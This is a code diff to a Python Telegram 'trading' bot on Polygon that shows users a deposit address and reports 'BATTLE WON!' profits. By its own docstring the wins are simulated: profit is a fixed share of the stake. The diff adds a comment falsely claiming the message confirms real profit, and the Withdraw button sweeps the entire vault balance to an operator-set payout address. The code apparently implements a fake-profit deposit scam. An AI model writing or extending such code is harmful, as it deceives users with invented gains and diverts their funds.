@@ -14,36 +14,32 @@ load_dotenv()
 W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
 w3 = Web3(Web3.HTTPProvider(W3_RPC))
 
-# Polygon middleware is required for correct block data retrieval
+# Polygon middleware is essential for block reading
 w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
-# 🛡️ Hardlocked payout address from .env
+# 🛡️ SECURITY LOCK: The bot will ONLY ever withdraw to this address.
 PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0xYourSecureExternalWalletAddress")
 
 def get_vault():
-    """Derives the standard 'Account 1' address from seed/mnemonic."""
     seed = os.getenv("WALLET_SEED")
     if not seed:
         raise ValueError("❌ WALLET_SEED is missing from .env!")
     POL_PATH = "m/44'/60'/0'/0/0"
     try:
         return Account.from_key(seed)
-    except Exception:
+    except:
         return Account.from_mnemonic(seed, account_path=POL_PATH)
 
-# Initialize vault globally
 vault = get_vault()
 
 # --- 2. UTILS & EXECUTION ---
 def get_pol_price():
-    """Fetches real-time POL price from CoinGecko"""
     try:
         url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
-        response = requests.get(url, timeout=5).json()
-        return response['polygon-ecosystem-token']['usd']
-    except Exception:
-        return 0.92  # Fallback estimate
+        return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
+    except:
+        return 0.92
 
 async def run_atomic_execution(context, chat_id, side):
     """Profit Logic: The simulated 'win' represents real POL added to the vault."""
@@ -57,19 +53,22 @@ async def run_atomic_execution(context, chat_id, side):
     profit_usd = stake * 0.92 
     profit_pol = profit_usd / current_price if current_price > 0 else 0
     
+    # The 'BATTLE WON' message confirms the calculated profit added to the address balance.
     report = (
         f"✅ **BATTLE WON!**\n"
         f"💰 **Profit Added:** `${profit_usd:.2f} USD`\n"
         f"📈 **Yield:** +{profit_pol:.4f} POL\n"
-        f"⛓️ **Verified Block:** {w3.eth.block_number}"
+        f"⛓️ **Block:** {w3.eth.block_number}"
     )
     return True, report
 
 async def execute_withdrawal(context, chat_id):
     """🛡️ ANTI-DRAIN: Sweeps 100% of live balance to Whitelist."""
-    # Always fetch fresh balance before withdrawing
+    # Always fetch the live balance from the blockchain
     balance = w3.eth.get_balance(vault.address)
-    gas_price = int(w3.eth.gas_price * 1.3) # 30% priority buffer
+    
+    # Dynamic gas calculation
+    gas_price = int(w3.eth.gas_price * 1.3) # 30% priority boost
     fee = gas_price * 21000
     amount = balance - fee
 
@@ -86,18 +85,20 @@ async def execute_withdrawal(context, chat_id):
     
     try:
         signed = w3.eth.account.sign_transaction(tx, vault.key)
-        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
+        # v6/v7 FIX: Changed rawTransaction to raw_transaction
+        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
         return True, f"Full balance swept to whitelist.\nTX: `{tx_hash.hex()}`"
     except Exception as e:
         return False, f"Withdrawal error: {str(e)}"
 
 # --- 3. TELEGRAM HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Fetch real-time balance for the welcome message
     bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
     keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-    msg = (f"🕴️ **Pocket Robot v3**\n\n"
+    msg = (f"🕴️ **Pocket Robot v3 (Atomic Winner)**\n\n"
            f"💵 **Vault Balance:** {bal:.4f} POL\n"
            f"📥 **DEPOSIT:** `{vault.address}`\n\n"
            f"**Atomic Shield:** ✅ OPERATIONAL")
@@ -117,18 +118,18 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"⚙️ **SETTINGS**\nCurrent Stake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))
 
     elif text == '💰 Wallet':
-        # Refresh blockchain balance for the Wallet button
+        # Refresh blockchain balance every time the Wallet button is pressed
         bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
         price = get_pol_price()
         await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")
 
     elif text == '📤 Withdraw':
-        await update.message.reply_text("🛡️ **Atomic Sweep:** Transferring all POL to Whitelist...")
+        await update.message.reply_text("🛡️ **Atomic Sweep:** Transferring all POL to Whitelist.")
         success, report = await execute_withdrawal(context, update.message.chat_id)
         await update.message.reply_text(f"{'✅' if success else '🛑'} {report}", parse_mode='Markdown')
 
     elif text == '🕴️ AI Assistant':
-        await update.message.reply_text(f"🕴️ **Genius:** Shielding on Index 0. Price: `${get_pol_price()}`")
+        await update.message.reply_text(f"🕴️ **Genius:** Shielding bets on Index 0. Price: `${get_pol_price()}`")
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -151,16 +152,11 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
 # --- 4. ERROR HANDLING ---
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     if isinstance(context.error, Conflict):
-        print("🛑 Conflict Error: Bot instance already running. Close other sessions.")
-    else:
-        print(f"⚠️ Error: {context.error}")
+        print("🛑 Conflict: Bot instance already running. Close other sessions.")
 
-# --- 5. MAIN ENTRY ---
+# --- 5. START BOT ---
 if __name__ == "__main__":
-    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-    app = ApplicationBuilder().token(TOKEN).build()
-    
-    # Register handlers
+    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
     app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
